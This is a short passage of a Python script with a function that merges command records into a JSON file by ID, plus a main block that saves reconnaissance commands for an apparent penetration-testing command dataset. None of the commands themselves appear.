# ============================================================
# SAVE ALL NEW COMMANDS
# ============================================================
def save_commands(filename, commands):
    filepath = OUTPUT_DIR / filename
    # Load existing if present
    existing = []
    if filepath.exists():
        with open(filepath, 'r') as f:
            existing = json.load(f)
    # Merge (avoid duplicates by ID)
    existing_ids = {c["id"] for c in existing}
    for cmd in commands:
        if cmd["id"] not in existing_ids:
            existing.append(cmd)
    with open(filepath, 'w') as f:
        json.dump(existing, f, indent=2)
    print(f"  {filepath.name}: {len(existing)} commands")


if __name__ == "__main__":
    print("Generating VAPT commands...")
    save_commands("reconnaissance_generated.json", RECON_NEW)
